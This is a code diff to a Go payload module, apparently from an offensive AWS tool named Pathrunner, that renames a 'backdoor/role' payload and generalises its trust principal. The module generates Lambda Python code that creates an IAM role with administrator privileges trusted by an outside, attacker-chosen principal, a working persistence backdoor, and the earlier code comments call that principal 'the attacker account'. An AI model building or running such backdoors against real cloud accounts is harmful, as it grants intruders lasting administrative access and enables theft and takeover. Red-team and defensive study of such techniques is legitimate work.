@@ -8,38 +8,38 @@ import (
 	"strings"
 )
 
-type BackdoorRolePayload struct{}
+type BackdoorCreateRolePayload struct{}
 
-func NewBackdoorRolePayload() *BackdoorRolePayload {
-	return &BackdoorRolePayload{}
+func NewBackdoorCreateRolePayload() *BackdoorCreateRolePayload {
+	return &BackdoorCreateRolePayload{}
 }
 
 func init() {
-	payloads.Register(NewBackdoorRolePayload())
+	payloads.Register(NewBackdoorCreateRolePayload())
 }
 
-func (p *BackdoorRolePayload) GetName() string {
-	return "backdoor/role"
+func (p *BackdoorCreateRolePayload) GetName() string {
+	return "backdoor/create-role"
 }
 
-func (p *BackdoorRolePayload) GetDescription() string {
-	return "Create an IAM role with administrator privileges and cross-account trust"
+func (p *BackdoorCreateRolePayload) GetDescription() string {
+	return "Create an IAM role with administrator privileges and a custom trust policy"
 }
 
-func (p *BackdoorRolePayload) GetTags() []string {
+func (p *BackdoorCreateRolePayload) GetTags() []string {
 	return []string{
 		payloads.TagServiceLambda,
 		payloads.TagLanguagePython,
 		payloads.TagTechniqueBackdoor,
-		payloads.TagTransportOutput,
+		payloads.TagTransportResponse,
 	}
 }
 
-func (p *BackdoorRolePayload) GetOptions() []modules.Option {
+func (p *BackdoorCreateRolePayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "BACKDOOR_ACCOUNT",
-			Description: "Your AWS account ID for the trust relationship",
+			Name:        "TRUSTED_PRINCIPAL",
+			Description: "Trusted principal ARN (e.g. arn:aws:iam::123456789012:user/name, arn:aws:iam::123456789012:root, or a service like lambda.amazonaws.com)",
 			Required:    true,
 		},
 		{
@@ -63,8 +63,8 @@ func (p *BackdoorRolePayload) GetOptions() []modules.Option {
 	}
 }
 
-func (p *BackdoorRolePayload) GenerateCode(options map[string]string) (string, error) {
-	backdoorAccount := options["BACKDOOR_ACCOUNT"]
+func (p *BackdoorCreateRolePayload) GenerateCode(options map[string]string) (string, error) {
+	trustedPrincipal := options["TRUSTED_PRINCIPAL"]
 	roleName := options["ROLE_NAME"]
 	externalID := options["EXTERNAL_ID"]
 	rolePath := options["ROLE_PATH"]
@@ -79,13 +79,19 @@ func (p *BackdoorRolePayload) GenerateCode(options map[string]string) (string, e
 		roleNameCode = "f'pathrunner-backdoor-{int(time.time())}'"
 	}
 
+	// Determine principal type: Service principals vs IAM/account principals
+	principalKey := "AWS"
+	if strings.HasSuffix(trustedPrincipal, ".amazonaws.com") {
+		principalKey = "Service"
+	}
+
 	trustPolicyCode := `{
         "Version": "2012-10-17",
         "Statement": [
             {
                 "Effect": "Allow",
                 "Principal": {
-                    "AWS": "arn:aws:iam::` + backdoorAccount + `:root"
+                    "` + principalKey + `": "` + trustedPrincipal + `"
                 },
                 "Action": "sts:AssumeRole"`
 
@@ -108,8 +114,11 @@ import boto3
 import time
 import random
 import string
+import os
 
 def lambda_handler(event, context):
+    trusted_principal = os.environ.get('TRUSTED_PRINCIPAL', '` + trustedPrincipal + `')
+
     result = {
         'message': 'Pathrunner backdoor role creation',
         'timestamp': context.aws_request_id,
@@ -122,7 +131,7 @@ def lambda_handler(event, context):
         # Generate role name if not specified
         role_name = ` + roleNameCode + `
 
-        # Trust policy allowing the attacker account to assume the role
+        # Trust policy allowing the specified principal to assume the role
         trust_policy = '''` + trustPolicyCode + `'''
 
         # Administrator access policy
@@ -152,7 +161,7 @@ def lambda_handler(event, context):
         # Test that the role was created successfully
         get_role_response = iam_client.get_role(RoleName=role_name)
 
-        result['backdoor_account'] = '` + backdoorAccount + `'`
+        result['trusted_principal'] = trusted_principal`
 
 	if externalID != "" {
 		code += `
@@ -186,7 +195,7 @@ def lambda_handler(event, context):
 	return code, nil
 }
 
-func (p *BackdoorRolePayload) ProcessResult(result string) (string, error) {
+func (p *BackdoorCreateRolePayload) ProcessResult(result string) (string, error) {
 	var lambdaResponse map[string]interface{}
 	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
 		return result, err
@@ -217,8 +226,8 @@ func (p *BackdoorRolePayload) ProcessResult(result string) (string, error) {
 				output.WriteString("Role Name: " + roleName + "\n")
 			}
 
-			if backdoorAccount, ok := parsedBody["backdoor_account"].(string); ok {
-				output.WriteString("Backdoor Account: " + backdoorAccount + "\n")
+			if trustedPrincipal, ok := parsedBody["trusted_principal"].(string); ok {
+				output.WriteString("Trusted Principal: " + trustedPrincipal + "\n")
 			}
 
 			if externalID, ok := parsedBody["external_id"].(string); ok {
@@ -248,9 +257,9 @@ func (p *BackdoorRolePayload) ProcessResult(result string) (string, error) {
 	return output.String(), nil
 }
 
-func (p *BackdoorRolePayload) Validate(options map[string]string) error {
-	if options["BACKDOOR_ACCOUNT"] == "" {
-		return fmt.Errorf("BACKDOOR_ACCOUNT is required for backdoor/role payload")
+func (p *BackdoorCreateRolePayload) Validate(options map[string]string) error {
+	if options["TRUSTED_PRINCIPAL"] == "" {
+		return fmt.Errorf("TRUSTED_PRINCIPAL is required for backdoor/create-role payload")
 	}
 	return nil
 }
